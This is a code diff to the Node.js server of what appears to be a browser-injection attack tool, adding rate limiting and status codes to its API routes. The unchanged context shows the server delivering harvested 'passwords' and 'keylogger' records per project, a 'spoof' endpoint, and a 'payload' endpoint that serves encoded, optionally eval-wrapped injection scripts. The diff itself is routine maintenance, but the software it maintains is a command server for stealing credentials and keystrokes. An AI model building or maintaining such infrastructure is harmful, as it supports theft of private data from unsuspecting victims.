@@ -41,6 +41,7 @@ const reverse = require('reverse-string')
 const parseAgent = require('user-agent-parser')
 const me = require('mongo-escape').escape
 const injector = require('./inject/server.js')
+const RateLimit = require('express-rate-limit')
 
 const inject = {
   core: UglifyJS.minify(fs.readFileSync('./inject/core.js', 'utf8')).code,
@@ -50,6 +51,18 @@ const inject = {
   clients: [],
   watchers: []
 }
+
+const apiLimiter = new RateLimit({
+  windowMs: 2*60*1000,
+  max: 100,
+  delayAfter: 10,
+  delayMs: 500,
+  message: JSON.stringify({
+    success: false,
+    reason: 'Too many requests, please try again later'
+  }, null, '    '),
+  //skipFailedRequests: true
+})
 
 injector.loadModules((modules, debugModules, count) => {
   inject.modules = modules
@@ -1636,7 +1649,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
     })
   })
 
-  app.get('/api/json/*', (req, res) => {
+  app.get('/api/json/*', apiLimiter, (req, res) => {
     var getAPI = (name, token) => {
       return new Promise((resolve, reject) => {
         request({
@@ -1728,37 +1741,41 @@ MongoClient.connect(config.mongodb, (err, client) => {
             passwords: json.passwords,
             keylogger: json.keylogger
           }
-          json = JSON.stringify(json, null, '    ')
-          res.send(json)
+          let stringified = JSON.stringify(json, null, '    ')
+          if (json.passwords.length == 0 && json.keylogger.length == 0) {
+            res.status(206).send(stringified)
+          } else {
+            res.send(stringified)
+          }
           console.log(
             chalk.greenBright('[API/JSON] ') +
             chalk.yellowBright('delivered ') +
             chalk.magentaBright(project) +
-            chalk.redBright(' (length=' + json.length + ') ') +
+            chalk.redBright(' (length=' + stringified.length + ') ') +
             chalk.yellowBright('to ') +
             chalk.magentaBright(user.login) +
             chalk.redBright(' (' + user.id + ') ')
           )
         } else {
-          res.send(JSON.stringify({
+          res.status(500).send(JSON.stringify({
             title: 'Database error',
             message: 'An internal error occured whilst handling your request'
           }, null, '    '))
         }
       }).catch(error => {
         res.setHeader('Content-Type', 'application/json')
-        res.send(JSON.stringify(error, null, '    '))
+        res.status(403).send(JSON.stringify(error, null, '    '))
       })
     } else if (token) {
       res.setHeader('Content-Type', 'application/json')
-      res.send(JSON.stringify({
+      res.status(400).send(JSON.stringify({
         title: 'Bad request',
         message: 'Specify a project name to return in request',
         format: 'https://injectify.samdd.me/api/json/PROJECT_NAME?token=' + token
       }, null, '    '))
     } else {
       res.setHeader('Content-Type', 'application/json')
-      res.send(JSON.stringify({
+      res.status(400).send(JSON.stringify({
         title: 'Bad request',
         message: 'Specify a token & project name to return in request',
         format: 'https://injectify.samdd.me/api/json/PROJECT_NAME?token=GITHUB_TOKEN'
@@ -1766,7 +1783,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
     }
   })
 
-  app.get('/api/spoof/*', (req, res) => {
+  app.get('/api/spoof/*', apiLimiter, (req, res) => {
     var getAPI = (name, index, token) => {
       return new Promise((resolve, reject) => {
         request({
@@ -1902,12 +1919,12 @@ MongoClient.connect(config.mongodb, (err, client) => {
           chalk.redBright(' (' + user.id + ') ')
         )
       }).catch(error => {
-        res.setHeader('Content-Type', 'application/json')
+        res.status(403).setHeader('Content-Type', 'application/json')
         res.send(JSON.stringify(error, null, '    '))
       })
     } else {
       res.setHeader('Content-Type', 'application/json')
-      res.send(JSON.stringify({
+      res.status(400).send(JSON.stringify({
         title: 'Bad request',
         message: 'Specify a token, project name and index to return in request',
         format: 'https://injectify.samdd.me/api/spoof/PROJECT_NAME?index=INDEX&token=GITHUB_TOKEN'
@@ -1915,7 +1932,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
     }
   })
 
-  app.get('/api/payload/*', (req, res) => {
+  app.get('/api/payload/*', apiLimiter, (req, res) => {
     function enc (string, enableEval) {
       if (req.query.base64 === 'false') {
         if (enableEval) {
@@ -2207,7 +2224,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
     } else {
       res.setHeader('Content-Type', 'application/javascript')
       let script = help
-      res.send(
+      res.status(400).send(
         beautify(script, {
           indent_size: 2
         })
